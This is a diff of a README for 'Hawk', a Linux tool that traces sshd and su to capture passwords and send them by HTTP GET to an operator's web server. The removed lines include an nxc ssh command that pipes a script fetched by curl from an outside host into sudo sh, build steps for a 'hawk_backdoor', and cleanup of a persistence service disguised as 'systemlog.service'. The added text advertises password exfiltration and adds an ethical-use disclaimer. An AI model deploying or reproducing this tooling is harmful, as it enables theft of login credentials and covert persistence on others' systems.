@@ -1,37 +1,35 @@
 # Hawk
 
-This tool monitors sshd and su for passwords.
+Hawk is a lightweight Golang tool designed to monitor the `sshd` and `su` services for passwords on Linux systems. It utilizes netlink sockets to capture proc events and ptrace to trace system calls related to password-based authentication.
 
-## Description
+## Features
 
-Hawk is a simple tool designed to monitor the `sshd` and `su` services for passwords. Its written in Golang and exfiltrates the passwords to via HTTP GET request to a web server.
+- Monitors SSH and SU commands for passwords
+- Reads memory from sshd and sudo system calls without writing to traced processes
+- Exfiltrates passwords via HTTP GET requests to a specified web server
+- Inspired by [3snake](https://github.com/blendin/3snake)
 
-## Building for web server
-
-```bash
-git clone https://github.com/MattKeeley/hawk.git &&
-cd hawk
-
-
-vim exfil.go and change the web server location
-
-
-go build -o hawk &&
-cp hawk /home/ubuntu/webserver &&
-cp hawk_backdoor /home/ubuntu/webserver
-```
-
-## Run once root is obtained:
+## Build
 
 ```bash
-nxc ssh -u "<user>" -p "<password>" --sudo-check -x 'echo "<password>" | sudo -S sh -c "$(curl -fsSL http://redteam.prodefense.io:1337/hawk.sh)"' "<target>"
+go build -o hawk
 ```
 
-## Turn off Hawk backdoor
+## Usage
 
-```bash
- sudo systemctl stop systemlog.service
- sudo systemctl disable systemlog.service
- sudo rm -rf /etc/systemd/system/systemlog.service
- sudo rm -rf /etc/systemlog
-```
+1. Adjust the HTTP Server location in the exfil.go file.
+2. Build Hawk using the provided command.
+3. Run Hawk with ./hawk.
+
+## Limitations
+
+- Linux systems with ptrace enabled
+- `/proc` filesystem must be mounted
+
+## Disclaimer
+
+This tool is intended for ethical and educational purposes only. Unauthorized use is prohibited. Use at your own risk.
+
+## Credits
+
+Hawk is inspired by the work of [blendin](https://github.com/blendin) and their tool [3snake](https://github.com/blendin/3snake).
